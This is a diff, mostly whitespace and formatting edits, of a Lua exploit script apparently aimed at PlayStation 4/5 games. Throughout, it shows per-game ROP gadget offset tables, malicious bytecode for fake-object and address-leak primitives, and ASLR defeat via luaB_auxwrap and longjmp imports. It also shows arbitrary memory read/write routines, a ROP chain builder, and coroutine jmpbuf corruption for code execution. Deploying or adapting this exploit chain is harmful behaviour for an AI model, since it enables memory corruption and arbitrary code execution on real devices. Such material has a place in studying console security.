@@ -1,4 +1,5 @@
-PLATFORM = "ps4" -- ps4 or ps5
+
+PLATFORM = "ps4"  -- ps4 or ps5
 LOG_TO_KLOG = true
 FW_VERSION = nil
 
@@ -62,8 +63,8 @@ gadget_table = {
             ["add rax, rcx; ret"] = 0x354be,
         },
         eboot_addrofs = {
-            fake_string = 0x600164,    -- SCE_RELRO segment, use ptr as size for fake string
-            luaB_auxwrap = 0x1a7bb0,   -- to resolve eboot base
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1a7bb0, -- to resolve eboot base
             longjmp_import = 0x619388, -- to resolve libc base
         },
         libc_addrofs = {
@@ -76,7 +77,7 @@ gadget_table = {
         }
     },
     aibeya = {
-        gadgets = {
+        gadgets = {    
             ["ret"] = 0x4c,
             ["jmp $"] = nil,
 
@@ -114,8 +115,8 @@ gadget_table = {
             ["add rax, rcx; ret"] = 0x35afe,
         },
         eboot_addrofs = {
-            fake_string = 0x600164,    -- SCE_RELRO segment, use ptr as size for fake string
-            luaB_auxwrap = 0x1aeb90,   -- to resolve eboot base
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1aeb90, -- to resolve eboot base
             longjmp_import = 0x6193e8, -- to resolve libc base
         },
         libc_addrofs = {
@@ -128,7 +129,7 @@ gadget_table = {
         }
     },
     hamidashi_creative = {
-        gadgets = {
+        gadgets = {    
             ["ret"] = 0x42,
             ["jmp $"] = nil,
 
@@ -169,8 +170,8 @@ gadget_table = {
             ["add rax, rcx; ret"] = 0x347ae,
         },
         eboot_addrofs = {
-            fake_string = 0x600164,    -- SCE_RELRO segment, use ptr as size for fake string
-            luaB_auxwrap = 0x1a7420,   -- to resolve eboot base
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1a7420, -- to resolve eboot base
             longjmp_import = 0x6168c0, -- to resolve libc base
         },
         libc_addrofs = {
@@ -183,7 +184,7 @@ gadget_table = {
         }
     },
     a = {
-        gadgets = {
+        gadgets = {    
             ["ret"] = 0x4c,
             ["jmp $"] = nil,
 
@@ -222,8 +223,8 @@ gadget_table = {
             ["add rax, rcx; ret"] = 0x34efe,
         },
         eboot_addrofs = {
-            fake_string = 0x600164,    -- SCE_RELRO segment, use ptr as size for fake string
-            luaB_auxwrap = 0x1a75d0,   -- to resolve eboot base
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1a75d0, -- to resolve eboot base
             longjmp_import = 0x619388, -- to resolve libc base
         },
         libc_addrofs = {
@@ -236,7 +237,7 @@ gadget_table = {
         }
     },
     c = {
-        gadgets = {
+        gadgets = {    
             ["ret"] = 0x4c,
             ["jmp $"] = nil,
 
@@ -275,8 +276,8 @@ gadget_table = {
             ["add rax, rcx; ret"] = 0x102341,
         },
         eboot_addrofs = {
-            fake_string = 0x600164,    -- SCE_RELRO segment, use ptr as size for fake string
-            luaB_auxwrap = 0x195280,   -- to resolve eboot base
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x195280, -- to resolve eboot base
             longjmp_import = 0x4caf88, -- to resolve libc base
         },
         libc_addrofs = {
@@ -289,10 +290,10 @@ gadget_table = {
         }
     },
     e = {
-        gadgets = {
+        gadgets = {    
             ["ret"] = 0x4c,
             ["jmp $"] = nil,
-
+            
             ["pop rsp; ret"] = 0x932,
             ["pop rbp; ret"] = 0x79,
             ["pop rax; ret"] = 0x922,
@@ -328,8 +329,8 @@ gadget_table = {
             ["add rax, rcx; ret"] = 0x355ce,
         },
         eboot_addrofs = {
-            fake_string = 0x600164,    -- SCE_RELRO segment, use ptr as size for fake string
-            luaB_auxwrap = 0x19f600,   -- to resolve eboot base
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x19f600, -- to resolve eboot base
             longjmp_import = 0x4f3ac0, -- to resolve libc base
         },
         libc_addrofs = {
@@ -342,10 +343,10 @@ gadget_table = {
         }
     },
     f = {
-        gadgets = {
+        gadgets = {    
             ["ret"] = 0x4c,
             ["jmp $"] = nil,
-
+            
             ["pop rsp; ret"] = 0xa02,
             ["pop rbp; ret"] = 0x79,
             ["pop rax; ret"] = 0x9f2,
@@ -381,8 +382,8 @@ gadget_table = {
             ["add rax, rcx; ret"] = 0x35afe,
         },
         eboot_addrofs = {
-            fake_string = 0x600164,    -- SCE_RELRO segment, use ptr as size for fake string
-            luaB_auxwrap = 0x1aed80,   -- to resolve eboot base
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1aed80, -- to resolve eboot base
             longjmp_import = 0x6193e8, -- to resolve libc base
         },
         libc_addrofs = {
@@ -402,7 +403,7 @@ gadget_table = {
 --
 
 function notify(s)
-    e:tag { "dialog", title = "", message = s }
+    e:tag{"dialog", title="", message=s}
 end
 
 function error(s)
@@ -415,7 +416,7 @@ end
 
 function prepare_arguments(...)
     local s = ""
-    for i, v in ipairs(arg) do
+    for i,v in ipairs(arg) do
         s = s .. tostring(v)
         if i < #arg then
             s = s .. "\t"
@@ -454,12 +455,12 @@ function hex_dump(buf, addr)
     addr = addr or 0
     local result = {}
     for i = 1, #buf, 16 do
-        local chunk = buf:sub(i, i + 15)
-        local hexstr = chunk:gsub('.', function(c)
-            return string.format('%02X ', string.byte(c))
+        local chunk = buf:sub(i, i+15)
+        local hexstr = chunk:gsub('.', function(c) 
+            return string.format('%02X ', string.byte(c)) 
         end)
         local ascii = chunk:gsub('%c', '.') -- replace non-printable characters
-        table.insert(result, string.format('%s  %-48s %s', hex(addr + i - 1), hexstr, ascii))
+        table.insert(result, string.format('%s  %-48s %s', hex(addr+i-1), hexstr, ascii))
     end
     return table.concat(result, '\n')
 end
@@ -497,10 +498,10 @@ function run_nogc(f)
     collectgarbage("restart")
 end
 
-function sleep(a)
-    local sec = tonumber(os.clock() + a);
-    while (os.clock() < sec) do
-    end
+function sleep(a) 
+    local sec = tonumber(os.clock() + a); 
+    while (os.clock() < sec) do 
+    end 
 end
 
 function dump_table(o, depth, indent)
@@ -549,8 +550,7 @@ function string_to_double(x)
     end
 end
 
-function align_to(v, n) return v + (n - v % n) % n end
-
+function align_to(v,n) return v + (n - v % n) % n end
 function align_16(v) return align_to(v, 16) end
 
 function find_pattern(buffer, pattern)
@@ -561,10 +561,14 @@ function find_pattern(buffer, pattern)
     while true do
         local s = buffer:find(pat, start)
         if not s then break end
-        matches[#matches + 1], start = s, s + 1
+        matches[#matches+1], start = s, s+1
     end
     return matches
 end
+
+
+
+
 
 --
 -- bit32 class
@@ -583,7 +587,7 @@ function bit32.bnot(x)
 end
 
 function bit32.band(...)
-    local args = { ... }
+    local args = {...}
     local result = args[1] or 0
     for i = 2, #args do
         local x, y = result, args[i]
@@ -614,15 +618,15 @@ function bit32.band(...)
 end
 
 function bit32.bor(...)
-    local args = { ... }
+    local args = {...}
     local result = args[1] or 0
     for i = 2, #args do
         local x, y = result, args[i]
         -- Common usecases, they deserve to be optimized
         if y == 0xff then
-            result = x - (x % 0x100) + 0xff
+            result = x - (x%0x100) + 0xff
         elseif y == 0xffff then
-            result = x - (x % 0x10000) + 0xffff
+            result = x - (x%0x10000) + 0xffff
         elseif y == 0xffffffff then
             result = 0xffffffff
         else
@@ -643,7 +647,7 @@ function bit32.bor(...)
 end
 
 function bit32.bxor(...)
-    local args = { ... }
+    local args = {...}
     local result = args[1] or 0
     for i = 2, #args do
         local x, y = result, args[i]
@@ -651,8 +655,8 @@ function bit32.bxor(...)
         result = 0
         local p = 1
         for j = 1, bit32.N do
-            local a, b = x % 2, y % 2
-            x, y = math.floor(x / 2), math.floor(y / 2)
+            local a, b = x%2, y%2
+            x, y = math.floor(x/2), math.floor(y/2)
             if a + b == 1 then
                 result = result + p
             end
@@ -676,7 +680,7 @@ function bit32.rshift(x, s_amount)
     if math.abs(s_amount) >= bit32.N then return 0 end
     x = x % bit32.P
     if s_amount > 0 then
-        return math.floor(x * (2 ^ -s_amount))
+        return math.floor(x * (2 ^ - s_amount))
     else
         return (x * (2 ^ -s_amount)) % bit32.P
     end
@@ -687,7 +691,7 @@ function bit32.arshift(x, s_amount)
     x = x % bit32.P
     if s_amount > 0 then
         local add = 0
-        if x >= bit32.P / 2 then
+        if x >= bit32.P/2 then
             add = bit32.P - 2 ^ (bit32.N - s_amount)
         end
         return math.floor(x * (2 ^ -s_amount)) + add
@@ -695,6 +699,11 @@ function bit32.arshift(x, s_amount)
         return (x * (2 ^ -s_amount)) % bit32.P
     end
 end
+
+
+
+
+
 
 --
 -- uint64 class
@@ -716,12 +725,12 @@ setmetatable(uint64, {
     end
 })
 
-function is_uint64(v)
-    return type(v) == "table" and v.h and v.l and true or false
+function is_uint64(v) 
+    return type(v) == "table" and v.h and v.l and true or false 
 end
 
-function ub8(n)
-    return uint64(n):pack()
+function ub8(n) 
+    return uint64(n):pack() 
 end
 
 function hex(v)
@@ -735,23 +744,24 @@ function hex(v)
 end
 
 function uint64:new(v)
+
     local self = setmetatable({}, uint64)
 
     if is_uint64(v) then
         self.h, self.l = v.h, v.l
     elseif type(v) == "number" then
-        self.h, self.l = math.floor(v / 2 ^ 32), v % 2 ^ 32
+        self.h, self.l = math.floor(v / 2^32), v % 2^32
     elseif type(v) == "string" then
-        if v:sub(1, 2):lower() == "0x" then -- init from hexstring
+        if v:sub(1, 2):lower() == "0x" then  -- init from hexstring
             v = v:sub(3):gsub("^0+", ""):upper()
             assert(#v <= 16, string.format("uint64:new: hex string too long for uint64 (%s)", v))
-            v = string.rep("0", 16 - #v) .. v -- pad with leading zeros
+            v = string.rep("0", 16 - #v) .. v  -- pad with leading zeros
             self.h = tonumber(v:sub(1, 8), 16) or 0
             self.l = tonumber(v:sub(9, 16), 16) or 0
         else
-            local num = tonumber(v) -- assume its normal number
+            local num = tonumber(v)  -- assume its normal number
             assert(num, string.format("uint64:new: invalid decimal string for uint64 (%s)", v))
-            self.h, self.l = math.floor(num / 2 ^ 32), num % 2 ^ 32
+            self.h, self.l = math.floor(num / 2^32), num % 2^32
         end
     else
         errorf("uint64:new: invalid type passed to constructor (%s)", type(v))
@@ -767,9 +777,9 @@ end
 
 function uint64:tonumber()
     if self.h >= 0x80000000 then -- for negative number
-        return -(bit32.bnot(self.h) * 2 ^ 32 + bit32.bnot(self.l) + 1)
+        return -(bit32.bnot(self.h) * 2^32 + bit32.bnot(self.l) + 1)
     else
-        return self.h * 2 ^ 32 + self.l
+        return self.h * 2^32 + self.l
     end
 end
 
@@ -790,11 +800,11 @@ function uint64.unpack(str)
     if not (type(str) == "string" and #str == 8 or #str == 4) then
         error("uint64.unpack: input string must be 8 or 4 length size")
     end
-    local l = str:byte(1) + bit32.lshift(str:byte(2), 8)
+    local l = str:byte(1) + bit32.lshift(str:byte(2), 8) 
         + bit32.lshift(str:byte(3), 16) + bit32.lshift(str:byte(4), 24)
-    local h = #str == 8 and (str:byte(5) + bit32.lshift(str:byte(6), 8)
+    local h = #str == 8 and (str:byte(5) + bit32.lshift(str:byte(6), 8) 
         + bit32.lshift(str:byte(7), 16) + bit32.lshift(str:byte(8), 24)) or 0
-    return uint64({ h = h, l = l })
+    return uint64({h = h, l = l})
 end
 
 -- note: comparison ops only work if both are same type
@@ -817,15 +827,15 @@ end
 function uint64:__add(v)
     v = uint64(v)
     local l = self.l + v.l
-    local h = self.h + v.h + (l >= 2 ^ 32 and 1 or 0)
-    return uint64({ h = h % 2 ^ 32, l = l % 2 ^ 32 })
+    local h = self.h + v.h + (l >= 2^32 and 1 or 0)
+    return uint64({h = h % 2^32, l = l % 2^32})
 end
 
 function uint64:__sub(v)
     v = uint64(v)
     local l = self.l - v.l
     local h = self.h - v.h - (l < 0 and 1 or 0)
-    return uint64({ h = (h + 2 ^ 32) % 2 ^ 32, l = (l + 2 ^ 32) % 2 ^ 32 })
+    return uint64({h = (h + 2^32) % 2^32, l = (l + 2^32) % 2^32})
 end
 
 function uint64:__mul(v)
@@ -833,7 +843,7 @@ function uint64:__mul(v)
     local ah, al, bh, bl = self.h, self.l, v.h, v.l
     local h = ah * bl + al * bh
     local l = al * bl
-    return uint64({ h = (h + bit32.rshift(l, 32)) % 2 ^ 32, l = l % 2 ^ 32 })
+    return uint64({h = (h + bit32.rshift(l, 32)) % 2^32, l = l % 2^32})
 end
 
 function uint64:divmod(v)
@@ -854,28 +864,27 @@ function uint64:divmod(v)
 end
 
 function uint64:__div(v) return select(1, self:divmod(v)) end
-
 function uint64:__mod(v) return select(2, self:divmod(v)) end
 
 function uint64:lshift(n)
     if n >= 64 then return uint64(0) end
     if n >= 32 then
-        return uint64({ h = bit32.lshift(self.l, n - 32), l = 0 })
+        return uint64({h = bit32.lshift(self.l, n - 32), l = 0})
     else
         local h = bit32.bor(bit32.lshift(self.h, n), bit32.rshift(self.l, 32 - n))
         local l = bit32.lshift(self.l, n)
-        return uint64({ h = h, l = l })
+        return uint64({h = h, l = l})
     end
 end
 
 function uint64:rshift(n)
     if n >= 64 then return uint64(0) end
     if n >= 32 then
-        return uint64({ h = 0, l = bit32.rshift(self.h, n - 32) })
+        return uint64({h = 0, l = bit32.rshift(self.h, n - 32)})
     else
         local h = bit32.rshift(self.h, n)
-        local l = bit32.bor(bit32.rshift(self.l, n), bit32.lshift(self.h % (2 ^ n), 32 - n))
-        return uint64({ h = h, l = l })
+        local l = bit32.bor(bit32.rshift(self.l, n), bit32.lshift(self.h % (2^n), 32 - n))
+        return uint64({h = h, l = l})
     end
 end
 
@@ -883,28 +892,32 @@ function uint64:bxor(v)
     v = uint64(v)
     local h = bit32.bxor(self.h, v.h)
     local l = bit32.bxor(self.l, v.l)
-    return uint64({ h = h, l = l })
+    return uint64({h = h, l = l})
 end
 
 function uint64:band(v)
     v = uint64(v)
     local h = bit32.band(self.h, v.h)
     local l = bit32.band(self.l, v.l)
-    return uint64({ h = h, l = l })
+    return uint64({h = h, l = l})
 end
 
 function uint64:bor(v)
     v = uint64(v)
     local h = bit32.bor(self.h, v.h)
     local l = bit32.bor(self.l, v.l)
-    return uint64({ h = h, l = l })
+    return uint64({h = h, l = l})
 end
 
 function uint64:bnot()
     local h = bit32.bnot(self.h)
     local l = bit32.bnot(self.l)
-    return uint64({ h = h, l = l })
+    return uint64({h = h, l = l})
 end
+
+
+
+
 
 --
 -- lua class
@@ -957,44 +970,46 @@ write_upval_bc = [[
 lua = {}
 
 function lua.setup_primitives()
+    
     -- evil bytecodes
     lua.fakeobj_closure = load_bytecode(fakeobj_lclosure_bc)
     lua.write_upval = load_bytecode(write_upval_bc)
 
-    lua.setup_initial_read_primitive() -- one small step
-    lua.resolve_address() -- break aslr and resolve offsets
-    lua.setup_victim_table() -- setup better addrof primitive
+    lua.setup_initial_read_primitive()  -- one small step
+    lua.resolve_address()  -- break aslr and resolve offsets
+    lua.setup_victim_table()  -- setup better addrof primitive  
 end
 
 -- allocate a limited length string with a known address
 function lua.create_str_hacky(data)
-    assert(#data <= 39)
 
+    assert(#data <= 39)
+    
     local prev_t1, prev_t2 = {}, {}
     local str, addr
 
-    for i = 1, 16 do
+    for i=1,16 do
         collectgarbage()
         local t = {}
-        local l, s
+        local l,s
 
         if i % 2 == 0 then
-            for j = 1, 5 do t[j] = {} end
+            for j=1,5 do t[j] = {} end
             s = data .. string.rep("\0", (39 - #data))
         else
             s = data .. string.rep("\0", (39 - #data))
-            for j = 1, 5 do t[j] = {} end
+            for j=1,5 do t[j] = {} end
         end
 
         prev_t1[i] = lua.addrof_trivial(t[1])
         prev_t2[i] = lua.addrof_trivial(t[2])
-
+        
         if i >= 3 then
-            if prev_t1[i - 1] == prev_t1[i - 2] then
-                str, addr = s, prev_t1[i - 1]
+            if prev_t1[i-1] == prev_t1[i-2] then
+                str, addr = s, prev_t1[i-1]
                 break
-            elseif prev_t2[i - 1] == prev_t2[i - 2] then
-                str, addr = s, prev_t2[i - 1]
+            elseif prev_t2[i-1] == prev_t2[i-2] then
+                str, addr = s, prev_t2[i-1]
                 break
             end
         end
@@ -1009,18 +1024,19 @@ function lua.create_str(str)
     if not addr then
         str, addr = lua.create_str_hacky(str)
     end
-    return str, addr + 24
+    return str, addr+24
 end
 
 function lua.fakeobj(fake_obj_addr, ttype)
     local addr, fake_tvalues, fake_proto, fake_closure
-    fake_tvalues, addr = lua.create_str(ub8(fake_obj_addr) .. ub8(ttype)) -- value + ttype
+    fake_tvalues, addr = lua.create_str(ub8(fake_obj_addr) .. ub8(ttype))  -- value + ttype
     fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
-    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr)) -- env + proto
+    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))  -- env + proto
     return lua.fakeobj_closure(fake_closure)
 end
 
 function lua.setup_initial_read_primitive()
+    
     local fake_str_size = 0x100000001337
 
     -- next + tt/marked/extra/padding/hash + len
@@ -1031,6 +1047,7 @@ function lua.setup_initial_read_primitive()
 end
 
 function lua.setup_better_read_primitive()
+
     -- setup fake string at first eboot segment we can read
     local new_fake_str_addr = eboot_addrofs.fake_string
 
@@ -1045,7 +1062,7 @@ function lua.resolve_game(luaB_auxwrap)
     print("[+] luaB_auxwrap @ " .. hex(luaB_auxwrap))
     local nibbles = luaB_auxwrap:band(uint64(0xfff)):tonumber()
     print("[+] luaB_auxwrap nibbles: " .. hex(nibbles))
-
+    
     if not games_identification[nibbles] then
         print("[-] Game not identified. Falling back to Raspberry Cube")
         eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
@@ -1053,7 +1070,7 @@ function lua.resolve_game(luaB_auxwrap)
         gadgets = gadget_table.raspberry_cube.gadgets
         return
     end
-
+    
     if games_identification[nibbles] == "RaspberryCube" then
         print("[+] Game identified as Raspberry Cube")
         eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
@@ -1095,32 +1112,33 @@ end
 function lua.resolve_address()
     luaB_auxwrap = nil
     local consume = {}
-    for i = 1, 64 do
+    for i=1,64 do
+
         local co = coroutine.wrap(function() end)
         consume[i] = co
 
         -- read f field of CClosure (luaB_auxwrap)
-        local addr = lua.read_qword(lua.addrof(co) + 0x20)
+        local addr = lua.read_qword(lua.addrof(co)+0x20)
         if addr then
             -- calculate eboot base from luaB_auxwrap offset
             luaB_auxwrap = addr
             break
         end
     end
-
+    
     lua.resolve_game(luaB_auxwrap)
-
+    
     eboot_base = luaB_auxwrap - eboot_addrofs.luaB_auxwrap
     print("[+] eboot base @ " .. hex(eboot_base))
 
     assert(eboot_base ~= nil, "failed to find eboot base")
 
     -- resolve offsets to their address
-    for k, offset in pairs(gadgets) do
-        gadgets[k] = eboot_base + offset
+    for k,offset in pairs(gadgets) do 
+        gadgets[k] = eboot_base + offset 
     end
-    for k, offset in pairs(eboot_addrofs) do
-        eboot_addrofs[k] = eboot_base + offset
+    for k,offset in pairs(eboot_addrofs) do 
+        eboot_addrofs[k] = eboot_base + offset 
     end
 
     -- setup fake string that can read more memory space
@@ -1129,9 +1147,9 @@ function lua.resolve_address()
     -- resolve libc
     libc_base = lua.read_qword(eboot_addrofs.longjmp_import) - libc_addrofs.longjmp
     print("[+] libc base @ " .. hex(libc_base))
-
-    for k, offset in pairs(libc_addrofs) do
-        libc_addrofs[k] = libc_base + offset
+    
+    for k,offset in pairs(libc_addrofs) do 
+        libc_addrofs[k] = libc_base + offset 
     end
 end
 
@@ -1139,9 +1157,9 @@ end
 function lua.setup_victim_table()
     assert(lua.fake_str ~= nil)
     local t = { 1, 2 }
-    local array_addr = lua.read_qword(lua.addrof(t) + 24)
+    local array_addr = lua.read_qword(lua.addrof(t)+24)
     if array_addr then
-        if lua.read_buffer(array_addr, 1) then -- test if we can read the buffer
+        if lua.read_buffer(array_addr, 1) then  -- test if we can read the buffer
             lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
         end
     end
@@ -1168,28 +1186,27 @@ function lua.read_buffer(addr, size)
     size = uint64(size):tonumber()
     -- check if addr to read is after fake string addr
     local rel_addr = uint64(addr - (lua.fake_str_addr + 23)):tonumber()
-    return rel_addr >= 0 and lua.fake_str:sub(rel_addr, rel_addr + size - 1) or nil
+    return rel_addr >= 0 and lua.fake_str:sub(rel_addr, rel_addr + size - 1) or nil 
 end
 
 function lua.read_qword(addr)
     local value = lua.read_buffer(addr, 8)
-    return value and #value == 8 and uint64.unpack(value) or nil
+    return value and #value == 8 and uint64.unpack(value) or nil 
 end
 
 function lua.read_multiple_qwords(addr, count)
     local qwords = {}
-    local buffer = lua.read_buffer(addr, count * 8)
-    for i = 0, (#buffer / 8) - 1 do
-        qwords[i + 1] = uint64.unpack(buffer:sub(i * 8 + 1, i * 8 + 8))
+    local buffer = lua.read_buffer(addr, count*8)
+    for i=0,(#buffer/8)-1 do
+        qwords[i+1] = uint64.unpack(buffer:sub(i*8+1, i*8+8))
     end
     return qwords
 end
 
 -- write 8 bytes (double) at target address with 4 bytes corruption
 function lua.write_double(addr, value)
-    local fake_upval = ub8(0x0) ..
-    ub8(0x0) .. ub8(addr) -- next + tt/marked + addr to tvalue
-    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.addrof(fake_upval) + 24) -- env + proto + upvals
+    local fake_upval = ub8(0x0) .. ub8(0x0) .. ub8(addr)  -- next + tt/marked + addr to tvalue
+    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.addrof(fake_upval)+24)  -- env + proto + upvals
     lua.write_upval(fake_closure, value)
 end
 
@@ -1198,12 +1215,12 @@ function lua.write_qword(addr, value)
     local setbit = uint64(1):lshift(56)
     value = uint64(value)
     lua.write_double(addr, string_to_double(ub8(value + setbit)))
-    lua.write_double(addr + 1, string_to_double(ub8(value:rshift(8) + setbit)))
+    lua.write_double(addr+1, string_to_double(ub8(value:rshift(8) + setbit)))
 end
 
 function lua.write_multiple_qwords(addr, list)
-    for i, v in ipairs(list) do
-        lua.write_qword(addr + 8 * (i - 1), list[i])
+    for i,v in ipairs(list) do
+        lua.write_qword(addr+8*(i-1), list[i])
     end
 end
 
@@ -1213,6 +1230,10 @@ function lua.memcpy(dest, src, size)
     assert(size % 8 == 0, string.format("lua.memcpy: size should be aligned by 8 bytes (given %s)", hex(size)))
     lua.write_multiple_qwords(dest, lua.read_multiple_qwords(src, size / 8))
 end
+
+
+
+
 
 --
 -- memory class
@@ -1229,29 +1250,29 @@ end
 
 function memory.read_dword(addr)
     local value = memory.read_buffer(addr, 4)
-    return value and uint64.unpack(value) or nil
+    return value and uint64.unpack(value) or nil 
 end
 
 function memory.read_qword(addr)
     local value = memory.read_buffer(addr, 8)
-    return value and uint64.unpack(value) or nil
+    return value and uint64.unpack(value) or nil 
 end
 
 function memory.write_buffer(dest, buffer)
     assert(memory.memcpy and dest and buffer)
-    memory.memcpy(dest, lua.addrof(buffer) + 24, #buffer)
+    memory.memcpy(dest, lua.addrof(buffer)+24, #buffer)
 end
 
 function memory.write_byte(dest, value)
-    memory.write_buffer(dest, ub8(value):sub(1, 1))
+    memory.write_buffer(dest, ub8(value):sub(1,1))
 end
 
 function memory.write_word(dest, value)
-    memory.write_buffer(dest, ub8(value):sub(1, 2))
+    memory.write_buffer(dest, ub8(value):sub(1,2))
 end
 
 function memory.write_dword(dest, value)
-    memory.write_buffer(dest, ub8(value):sub(1, 4))
+    memory.write_buffer(dest, ub8(value):sub(1,4))
 end
 
 function memory.write_qword(dest, value)
@@ -1272,7 +1293,7 @@ function memory.read_null_terminated_string(addr)
     while true do
         local chunk = memory.read_buffer(addr, 0x50)
         local null_pos = chunk:find("\0")
-        if null_pos then
+        if null_pos then 
             return result .. chunk:sub(1, null_pos - 1)
         end
         result = result .. chunk
@@ -1280,6 +1301,10 @@ function memory.read_null_terminated_string(addr)
     end
     return result
 end
+
+
+
+
 
 --
 -- bump allocator class
@@ -1289,7 +1314,7 @@ end
 
 bump = {}
 
-bump.pool_size = 5 * 1024 * 1024 -- 5mb
+bump.pool_size = 5 * 1024 * 1024  -- 5mb
 
 function bump.init()
     local padding = align_16(24) -- offset to data
@@ -1299,6 +1324,7 @@ function bump.init()
 end
 
 function bump.alloc(size)
+
     assert(type(size) == "number")
 
     -- init for first time
@@ -1326,6 +1352,10 @@ function bump.free_after_finish(f)
     bump.pool_current = prev_cur
 end
 
+
+
+
+
 --
 -- ropchain class
 --
@@ -1336,12 +1366,13 @@ ropchain = {}
 ropchain.__index = ropchain
 
 setmetatable(ropchain, {
-    __call = function(_, stack_size, padding, stack_base) -- make class callable as constructor
+    __call = function(_, stack_size, padding, stack_base)  -- make class callable as constructor
         return ropchain:new(stack_size, padding, stack_base)
     end
 })
 
 function ropchain:new(stack_size, padding, stack_base)
+
     stack_size = stack_size or 0x500
 
     -- our rop might call a fn with huge stack frame, which side effect of
@@ -1354,12 +1385,12 @@ function ropchain:new(stack_size, padding, stack_base)
     self.stack_size = stack_size + padding
     self.stack_base = stack_base or bump.alloc(self.stack_size) + padding
     self.stack_backup = bump.alloc(self.stack_size) + padding
-
+    
     self.jmpbuf_size = 0x50
     self.jmpbuf_backup = bump.alloc(self.jmpbuf_size)
-
+    
     self.recover_from_call = bump.alloc(0x20)
-
+    
     self.retval_addr = {}
     self.placeholder = {}
     self.placeholder_value = {}
@@ -1368,7 +1399,7 @@ function ropchain:new(stack_size, padding, stack_base)
     self.increment_stack(self)
 
     -- recover from call [rax+8] instruction
-    lua.write_qword(self.recover_from_call + 8, gadgets["pop rbx; ret"])
+    lua.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])
 
     return self
 end
@@ -1376,16 +1407,16 @@ end
 function ropchain:get_symbols()
     local value_symbol = {}
     local offset_symbol = {}
-    for i, t in ipairs({ gadgets, eboot_addrofs, libc_addrofs }) do
-        for k, v in pairs(t) do
+    for i,t in ipairs({gadgets, eboot_addrofs, libc_addrofs}) do
+        for k,v in pairs(t) do
             value_symbol[hex(v)] = k
         end
     end
-    -- for k,v in pairs(syscall_wrapper) do
+    -- for k,v in pairs(syscall_wrapper) do 
     --     value_symbol[hex(v)] = "syscall " .. tostring(k)
     -- end
-    for name, t in pairs(self.placeholder) do
-        for i, offset in ipairs(t) do
+    for name,t in pairs(self.placeholder) do
+        for i,offset in ipairs(t) do
             offset_symbol[offset] = string.format("placeholder %s [%d]", name, i)
         end
     end
@@ -1393,18 +1424,19 @@ function ropchain:get_symbols()
 end
 
 function ropchain:__tostring()
+
     local result = {}
 
-    table.insert(result, string.format("ropchain @ %s (size: %s)\n",
+    table.insert(result, string.format("ropchain @ %s (size: %s)\n", 
         hex(self.stack_base), hex(self:chain_size())))
-
+    
     -- stack base will be corrupted after execution so use backup as source for printing
     local source = self.finalized and self.stack_backup or self.stack_base
     local qwords = lua.read_multiple_qwords(source, self:chain_size() / 8)
     local value_symbol, offset_symbol = self:get_symbols()
 
-    for i, val in pairs(qwords) do
-        local offset = 8 * (i - 1)
+    for i,val in pairs(qwords) do
+        local offset = 8*(i-1)
         val = hex(val)
         if offset_symbol[offset] then
             val = val .. string.format("\t; %s", offset_symbol[offset])
@@ -1417,8 +1449,8 @@ function ropchain:__tostring()
     return "\n" .. table.concat(result, "\n")
 end
 
-function ropchain:chain_size() return self.stack_offset end
 
+function ropchain:chain_size() return self.stack_offset end
 function ropchain:get_rsp() return self.stack_base + self:chain_size() end
 
 -- align stack to 16 bytes
@@ -1454,12 +1486,12 @@ function ropchain:push_ret()
     self:push(gadgets["ret"])
 end
 
-function ropchain:push_set_rsp(v)
+function ropchain:push_set_rsp(v) 
     self:push(gadgets["pop rsp; ret"])
     self:push(v)
 end
 
-function ropchain:push_set_rbp(v)
+function ropchain:push_set_rbp(v) 
     self:push(gadgets["pop rbp; ret"])
     self:push(v)
 end
@@ -1478,7 +1510,6 @@ function ropchain:push_set_rcx(v)
     self:push(gadgets["pop rcx; ret"])
     self:push(v)
 end
-
 function ropchain:push_set_rdx(v)
     self:push(gadgets["pop rdx; ret"])
     self:push(v)
@@ -1606,7 +1637,7 @@ end
 
 function ropchain:get_retval()
     local retval = {}
-    for i, v in ipairs(self.retval_addr) do
+    for i,v in ipairs(self.retval_addr) do
         table.insert(retval, lua.read_qword(v))
     end
     return retval
@@ -1628,11 +1659,12 @@ end
 
 function ropchain:set_branch_point(branch_point, rsp_cond_met, rsp_cond_not_met)
     lua.write_qword(branch_point, rsp_cond_not_met)
-    lua.write_qword(branch_point + 8, rsp_cond_met)
+    lua.write_qword(branch_point+8, rsp_cond_met)
 end
 
 -- only unsigned comparison is supported
 function ropchain:create_branch(value_address, op, compare_value)
+
     local branch_point = bump.alloc(0x10)
 
     if gadgets["cmp [rcx], eax; ret"] then
@@ -1671,16 +1703,17 @@ function ropchain:create_branch(value_address, op, compare_value)
     self:push(gadgets["mov rax, [rax]; ret"])
 
     -- rsp = rax
-    self:push_store_rax_into_memory(self:get_rsp() + 8 * 4) -- overwrite pop rsp value
+    self:push_store_rax_into_memory(self:get_rsp() + 8*4)   -- overwrite pop rsp value
     self:push_set_rsp(0)
 
     return branch_point
 end
 
 function ropchain:gen_loop(value_address, op, compare_value, callback)
-    -- todo: if gadgets inside callback() calls a fn or syscall, it
-    --       might corrupt the chain before the call location
 
+    -- todo: if gadgets inside callback() calls a fn or syscall, it 
+    --       might corrupt the chain before the call location
+    
     -- {
     local target_loop = self:get_rsp()
     callback()
@@ -1692,14 +1725,16 @@ end
 
 -- corrupt coroutine's jmpbuf for code execution
 function ropchain:execute_rop()
+
     local run_hax = function(lua_state_addr)
+
         -- backup original jmpbuf
